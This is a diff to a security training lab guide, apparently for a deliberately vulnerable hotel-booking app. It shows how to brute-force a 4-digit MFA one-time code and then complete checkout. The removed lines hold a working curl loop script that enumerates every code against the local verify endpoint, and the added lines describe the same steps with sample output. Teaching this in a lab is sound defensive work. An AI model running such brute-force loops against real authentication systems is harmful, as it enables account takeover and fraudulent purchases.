@@ -132,59 +132,33 @@ Each wrong guess decrements it; reaching 0 invalidates the challenge.
 
 Set `MfaBruteForceProtection` to `"Vulnerable"` in `appsettings.json` and restart the API.
 
-The following script enumerates every possible 4-digit code until the server returns `200 OK`,
-then immediately attempts checkout to prove the session is now unblocked.
+The script in `labs/hacking_scripts/brute_force_otp_and_checkout.sh`:
+1. Adds a hotel to the cart (simulating the victim's in-progress booking)
+2. Confirms checkout is blocked with 403
+3. Requests a fresh OTP challenge
+4. Enumerates 0000–9999 until verify returns 200
+5. Immediately attempts checkout to prove the session is now MFA-stamped
 
-```sh
-#!/bin/sh
-# brute_force_otp.sh — BookingDojo Lab 11
-COOKIES="$1"
-BFF="http://localhost:5001"
-
-if [ -z "$COOKIES" ]; then
-  echo "Usage: $0 <cookie-file>"
-  exit 1
-fi
-
-# Request a fresh challenge
-curl -s -X POST "$BFF/bff/auth/mfa/challenge" \
-  -b "$COOKIES" > /dev/null
-
-echo "Brute-forcing OTP (0000–9999)…"
-i=0
-while [ "$i" -le 9999 ]; do
-  CODE=$(printf '%04d' "$i")
-  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
-    -X POST "$BFF/bff/auth/mfa/verify" \
-    -b "$COOKIES" -c "$COOKIES" \
-    -H "Content-Type: application/json" \
-    -d "{\"code\":\"$CODE\"}")
-  if [ "$STATUS" = "200" ]; then
-    echo "Found OTP: $CODE (after $i attempts)"
-    echo "Attempting checkout…"
-    curl -s -b "$COOKIES" -X POST "$BFF/bff/cart/checkout" \
-      -H "Content-Type: application/json" \
-      -d '{}' | jq .
-    exit 0
-  fi
-  i=$(( i + 1 ))
-done
-
-echo "Not found — challenge may have expired."
-```
-
-> **Note:** `-c "$COOKIES"` on the verify call is important — the BFF updates the session
-> cookie after a successful verify (to stamp `mfa_verified_at`), and curl must save it.
-
-Run it:
+> **Note:** `-c "$COOKIES"` on the verify call is critical — the BFF re-issues the session
+> cookie after a successful verify (stamping `mfa_verified_at`), and curl must save it.
 
 ```bash
-chmod +x brute_force_otp.sh
-./brute_force_otp.sh cookies.txt
-# Brute-forcing OTP (0000–9999)…
-# Found OTP: 3742 (after 3742 attempts)
-# Attempting checkout…
-# { "bookings": [...] }
+sh labs/hacking_scripts/brute_force_otp_and_checkout.sh cookies.txt
+```
+
+Expected output:
+```
+Adding item to cart…
+Cart item added (hotel a620e356-…).
+Confirming checkout requires MFA…
+Confirmed: checkout blocked (403). Starting brute force…
+Brute-forcing OTP (0000–9999)…
+Found OTP: 3742 (after 3742 attempts)
+Attempting checkout…
+{
+  "bookings": [{ "id": 42, "hotelName": "Beach Paradise Resort", ... }],
+  ...
+}
 ```
 
 On average 5,000 requests are needed; at 200 req/s that is ~25 seconds.
